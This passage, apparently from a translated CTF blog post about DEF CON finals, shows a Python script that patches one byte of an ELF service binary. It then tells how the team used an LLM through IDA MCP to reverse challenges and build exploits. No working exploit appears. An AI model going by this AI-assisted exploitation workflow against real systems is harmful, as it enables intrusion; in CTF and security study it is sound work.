    raise RuntimeError(&quot;could not map VA to file offset (no PT_LOAD contains it)&quot;)


def main() -&gt; None:
    path = sys.argv[1] if len(sys.argv) &gt; 1 else &quot;ico&quot;
    if not os.path.isfile(path):
        print(f&quot;error: binary not found: {path}&quot;)
        sys.exit(1)

    backup = path + &quot;.bak&quot;
    if not os.path.exists(backup):
        shutil.copy2(path, backup)
        print(f&quot;backup created: {backup}&quot;)

    with open(path, &quot;r+b&quot;) as f:
        p_offset, p_vaddr, _ = elf64_read_phdr_mapping(f)
        file_off = p_offset + (TARGET_VA - p_vaddr)
        imm_off = file_off + IMM_DELTA

        f.seek(file_off)
        insn = f.read(8)
        if len(insn) &lt; 4:
            raise RuntimeError(&quot;failed to read instruction bytes&quot;)

        # Sanity: first byte should be 0xC6 (mov r/m8, imm8) in typical codegen
        # and the current imm8 should be 0x02.
        ok = True
        if insn[0] != 0xC6:
            print(&quot;warning: opcode 0xC6 not found at target; proceeding anyway&quot;)
            ok = False
        if insn[3] != 0x02:
            print(f&quot;warning: unexpected imm8 {insn[3]:#x} at target; proceeding anyway&quot;)
            ok = False
        print(f&quot;before bytes: {insn[:4].hex()}&quot;)

        # Write imm8 = 0x01
        f.seek(imm_off)
        f.write(b&quot;\x01&quot;)

        f.seek(file_off)
        after = f.read(4)
        print(f&quot;after  bytes: {after.hex()}&quot;)
        if ok and after[0] == 0xC6 and after[3] == 0x01:
            print(&quot;patch applied: default comment type now 1 (literal)&quot;)
        else:
            print(&quot;patch written; verify in a disassembler&quot;)


if __name__ == &quot;__main__&quot;:
    main()

</div></code></pre>
<p>就這樣！單位元補丁，一次成功，隔天早上我們把補丁上線，也沒有觸發主辦單位的 SLA 檢查。</p>
<h1 id="%E5%81%89%E5%A4%A7%E7%9A%84%E6%B0%9B%E5%9C%8D%E9%80%86%E5%90%91-vibe-ening">偉大的「氛圍逆向 (Vibe-ening)」</h1>
<p>這件事讓人難以置信——我們房間裡的每個人一開始都不信，以為程式碼在某種程度上曲解了輸出，但事實不是，它真的拿到了 flag，現場一片嘩然。
很快，其他人也開始下載 IDA MCP，並把各種挑戰丟進去跑；世界級的逆向與利用者暫時停下對二進位的人工作業，我們讓 LLM 來做繁重工作，這種只靠 MCP 解真題的感覺超現實，我們進入了所謂「vibe‑reversing（氛圍逆向）」的新境地。
然而樂趣到此為止，這題之後我們只自動解了一題 Live CTF，除此之外沒有其他實質成果。
我其實對用這種方式解題有點煩，某一方面，技術能自動化到這種程度真的很酷，但另一方面，我喜歡解謎、學習與挑戰，我不想成為軟體或提示工程師，我想親手 pwn 題目，而不是成為 LLM 的傀儡。</p>
<h1 id="%E6%94%B6%E7%A9%AB">收穫</h1>
<p>我認為這是一場完美風暴的結果：</p>
<ul>
<li>新模型（GPT‑5）特別強調工具呼叫。</li>
<li>挑戰已被部分逆向。</li>
<li>穿越二進位的路徑很直白——沒有花招，純逆向。</li>
<li>所需利用很簡單（只需要 10 個位元組，其中 5 個是 /flag）。</li>
</ul>
<p>如果我更早允許它用 Python 自己驗證工作，並告訴它 flag 檔案的內容，這裡的利用路徑應該可以短很多。
我會把這段建立腳本的經驗濃縮成以下幾步：「從 IDA 收集知識 → 形成假設 → 建立利用腳本 → 分析輸出 → 把新發現回灌到 IDA」，循環做就能得到相當不錯的成果。
我不認為這個方法可以解所有 CTF 挑戰——也許能解一些，但絕不是大多數。
CTF 並沒有死，我們會調整、克服，不讓 LLM 取勝；當具備符號執行的 angr 在 2015 年推出時，我們看到簡單的 crackme 類型越來越少，密碼學與其他逆向開始加入反符號執行技巧來對抗它，我們會在工具變強時繼續精進駭客技術。
CTF 的確改變了，我認為是這樣，一年前這還不可能；LLM 的出現正滲透到生活中的每個角落——CTF 也不例外，我們只需要讓挑戰更能抵抗 LLM，就像過去針對任何新技術所做的一樣。</p>
<p>感謝閱讀，Clasm。</p>
<h2 id="%E4%B8%8B%E8%BC%89">下載</h2>
<ul>
<li><a href="https://wilgibbs.com/assets/blog/2025-08-14_defcon_finals_mcp/cursor_reverse_engineering_a_server_app.md">cursor_transcript.md</a>（很可惜不含工具呼叫）</li>
</ul>

</body>
</html>
